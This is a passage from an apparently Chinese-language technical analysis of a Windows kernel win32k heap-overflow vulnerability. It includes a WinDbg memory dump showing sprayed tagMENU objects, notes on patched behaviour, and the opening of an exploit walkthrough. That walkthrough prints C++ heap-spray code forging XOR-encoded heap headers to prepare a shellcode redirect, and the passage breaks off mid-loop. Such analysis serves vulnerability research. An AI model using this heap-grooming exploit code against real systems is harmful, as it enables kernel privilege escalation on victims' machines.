    fffff901`40a73b38  96f56c89 0800086e 000426ed 00000000      tagMENU start
    fffff901`40a73b48  00000000 00000000 00000000 00000000
    fffff901`40a73b58  da0a2090 ffffe000 40a73b40 fffff901
    fffff901`40a73b68  00000000 00000000 00000008 00000001
    fffff901`40a73b78  00000000 00000000 00000000 00000000
    fffff901`40a73b88  00000000 00000000 408befe0 fffff901      将该值通过SetMenuItemInfoA修改为shellcode的地址，此时尚未修改
    fffff901`40a73b98  00000000 00000000 00000000 00000000
    fffff901`40a73ba8  00000000 00000000 00000000 00000000
    fffff901`40a73bb8  00000000 00000000 00000000 00000000
    fffff901`40a73bc8  00000000 00000000 00000000 00000000
    fffff901`40a73bd8  8cf56c93 10000874 00000000 00000000
    fffff901`40a73be8  9df56d83 10000865 41414141 41414141
    fffff901`40a73bf8  41414141 41414141 41414141 41414141
    fffff901`40a73c08  41414141 41414141 41414141 41414141
    fffff901`40a73c18  41414141 41414141 41414141 41414141
    fffff901`40a73c28  41414141 41414141 41414141 41414141
    fffff901`40a73c38  41414141 41414141 41414141 41414141
    fffff901`40a73c48  41414141 41414141 41414141 41414141
    fffff901`40a73c58  41414141 41414141 41414141 41414141
    fffff901`40a73c68  41414141 41414141 41414141 41414141
    fffff901`40a73c78  41414141 41414141 41414141 41414141
    fffff901`40a73c88  41414141 41414141 41414141 41414141
    fffff901`40a73c98  41414141 41414141 41414141 41414141
    fffff901`40a73ca8  41414141 41414141 41414141 41414141
    fffff901`40a73cb8  41414141 41414141 41414141 41414141
    fffff901`40a73cc8  41414141 41414141 00000000 00000000
    fffff901`40a73cd8  9ff56c80 0800086e 00000002 00000002
    fffff901`40a73ce8  aaaabbbb aaaabbbb 00000001 00000000
    fffff901`40a73cf8  bbbbbbbb bbbbbbbb 00002261 00000000
    fffff901`40a73d08  96f56c89 0800087d 000426eb 00000000
    fffff901`40a73d18  00000000 00000000 00000000 00000000
    fffff901`40a73d28  da0a2090 ffffe000 40a73d10 fffff901
    fffff901`40a73d38  00000000 00000000 00000008 00000001
    fffff901`40a73d48  00000000 00000000 00000000 00000000
    fffff901`40a73d58  00000000 00000000 408bf470 fffff901
    fffff901`40a73d68  00000000 00000000 00000000 00000000
    fffff901`40a73d78  00000000 00000000 00000000 00000000
    fffff901`40a73d88  00000000 00000000 00000000 00000000
    fffff901`40a73d98  00000000 00000000 00000000 00000000
    fffff901`40a73da8  9ff56c80 08000874 00000002 00000002
    fffff901`40a73db8  aaaabbbb aaaabbbb 00000001 00000000
    fffff901`40a73dc8  bbbbbbbb bbbbbbbb 00002262 00000000
    fffff901`40a73dd8  96f56c89 0800087d 000426e9 00000000
    fffff901`40a73de8  00000000 00000000 00000000 00000000
    fffff901`40a73df8  da0a2090 ffffe000 40a73de0 fffff901
#### 补丁后动态分析
首先下硬件断点
执行exp，可以看到windbg中断在了函数起始的位置
然后执行到第一个xxxDrawScrollBar的位置上，此时观察下rbx和rdi+0xb0位置上的值，可以观察到，此时rdi+0xb0位置上的值还并未改变
这时F10进入下一步，执行完了xxxDrawScrollBar，再观察下rbx和rdi+0xb0位置的值，可以发现，两块缓冲区都被破坏掉了
不进行跳转，执行releasedc
成功的将漏洞利用防御住了
### 5、EXP分析
本文根据公网已有的exp分析，包括绕过各个安全机制，hook等等，提炼出以下几个关键步骤：
1、堆喷函数，主要进行堆空间的布局，也就是堆风水，堆喷后堆空间的布局基本和上面动态分析的差不多，这里就不再赘述了
    BOOL SprayObject()
    {
        int j = 0;
        CHAR o1str[OVERLAY1_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
        CHAR o2str[OVERLAY2_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
        LARGE_UNICODE_STRING o1lstr, o2lstr;
        // build first overlay
        memset(o1str, '\x43', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
        RtlInitLargeUnicodeString(&o1lstr, (WCHAR*)o1str, (UINT)-1, OVERLAY1_SIZE - _HEAP_BLOCK_SIZE - 2);
        // build second overlay
        memset(o2str, '\x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
        *(DWORD*)o2str = 0x00000000;
        *(DWORD*)(o2str + 4) = 0x00000000;
        *(DWORD*)(o2str + 8) = 0x00010000 + OVERLAY2_SIZE;
        *(DWORD*)(o2str + 12) = 0x10000000 + ((OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE) / 0x10);
        string clearh, newh;
        o2str[11] = o2str[8] ^ o2str[9] ^ o2str[10];
        clearh.append(o2str, 16);
        newh = XOR(clearh, xorKey);
        memcpy(o2str, newh.c_str(), 16);
        RtlInitLargeUnicodeString(&o2lstr, (WCHAR*)o2str, (UINT)-1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);
        SHORT unused_win_index = 0x20;
        for (SHORT i = 0; i 
* * *